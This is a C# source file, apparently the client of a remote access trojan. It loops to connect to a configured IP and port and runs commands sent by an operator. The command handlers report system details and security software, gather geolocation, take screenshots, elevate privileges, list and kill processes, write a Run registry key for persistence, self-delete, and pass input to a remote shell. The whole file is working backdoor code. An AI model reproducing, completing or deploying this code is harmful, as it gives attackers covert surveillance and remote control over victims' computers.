using Client.Config;
using Client.Data;
using Client.Utils;
using System;

namespace Client
{
    internal static class Program
    {
        private static readonly Serialize _Serialize = new Serialize();
        private static readonly Deserialize _Deserialize = new Deserialize();

        private static void Main()
        {
            while (true)
            {
                try
                {
                    if (Network.Client.Connected)
                    {
                        new IO().Output(_Deserialize);

                        SelectType(_Deserialize.Data_XML.Command);
                    }
                    else { throw new Exception(); }
                }
                catch { Network.Client.Connect(Settings.IP, Settings.PORT); }
            }
        }

        private static void SelectType(string _Type)
        {
            switch (_Type)
            {
                case "1":
                    _Serialize.Data_XML.Data = "" +
                        $" [Name: {Settings.NAME}]" +
                        $" [PC: {SysInfo.PC}]" +
                        $" [User: {SysInfo.UserName}]" +
                        $" [OS: {SysInfo.OS.Replace("Windows", "Win")}]" +
                        $" [AV: {SysInfo.AntiVirus}]" +
                        $" [Privilege: {SysInfo.Privilege}]";
                    new IO().Input(_Serialize);
                    break;

                case "3":
                    _Serialize.Data_XML.Data = "\n" +
                        $"\t    CountryCode:   {GeoLocation.CountryCode}\n" +
                        $"\t    CountryName:   {GeoLocation.CountryName}\n" +
                        $"\t    RegionCode:    {GeoLocation.RegionCode}\n" +
                        $"\t    RegionName:    {GeoLocation.RegionName}\n" +
                        $"\t    City:          {GeoLocation.City}\n" +
                        $"\t    TimeZone:      {GeoLocation.TimeZone}\n" +
                        $"\t    IP:            {GeoLocation.IP}\n" +
                        $"\t    AntiSpyware:   {SysInfo.AntiSpyware}\n" +
                        $"\t    AntiVirus:     {SysInfo.AntiVirus}\n" +
                        $"\t    Firewall:      {SysInfo.Firewall}\n" +
                        $"\t    System:        {SysInfo.OS}\n" +
                        $"\t    PC:            {SysInfo.PC}\n" +
                        $"\t    UserName:      {SysInfo.UserName}\n" +
                        $"\t    Privilege:     {SysInfo.Privilege}\n" +
                        $"\t    Architecture:  {SysInfo.OSArchitecture}\n" +
                        $"\t    CPU:           {SysInfo.CPU}\n" +
                        $"\t    GPU1:          {SysInfo.GPU1}\n" +
                        $"\t    GPU2:          {SysInfo.GPU2}\n" +
                        $"\t    RAM:           {SysInfo.RAM}" + " GB" + "\n" +
                        $"\t    .NET:          {SysInfo.DOTNET}";
                    new IO().Input(_Serialize);
                    break;

                case "4":
                    _Serialize.Data_XML.Data = "\n => Desktop Screenshot Created";
                    _Serialize.Data_XML.File = new ScreenShot().Save();
                    new IO().Input(_Serialize);
                    _Serialize.Data_XML.File = null;
                    break;

                case "5":
                    new Privilege().Elevate();
                    break;

                case "6":
                    _Serialize.Data_XML.Data = $"\n => {SysInfo.Application}";
                    new IO().Input(_Serialize);
                    break;

                case "7":
                    _Serialize.Data_XML.Data = $"\n\t {new Apps().Get("SELECT * FROM Win32_Product")}";
                    new IO().Input(_Serialize);
                    break;

                case "8":
                    _Serialize.Data_XML.Data = $"\n\t {new Processes().Get()}";
                    new IO().Input(_Serialize);
                    break;

                case "9":
                    int _PID = Convert.ToInt32(_Deserialize.Data_XML.Data);
                    _Serialize.Data_XML.Data = $"\n => {new Processes().Kill(_PID)}";
                    new IO().Input(_Serialize);
                    break;

                case "12":
                    string _Sub_Key = @"Software\Microsoft\Windows\CurrentVersion\Run\";
                    new Persistence().Payload(_Sub_Key);
                    _Serialize.Data_XML.Data = $"\n => Key Created: {_Sub_Key}";
                    new IO().Input(_Serialize);
                    break;

                case "9999":
                    _Serialize.Data_XML.Data = $"\n => {new Payload().Delete()}";
                    new IO().Input(_Serialize);
                    Environment.Exit(0x0);
                    break;

                case "Shell":
                    string _Shell = _Deserialize.Data_XML.Shell;
                    string _Data = _Deserialize.Data_XML.Data;
                    _Serialize.Data_XML.Data = $"{new Shell().Write(_Shell, _Data)}";
                    new IO().Input(_Serialize);
                    break;
            }
        }
    }
}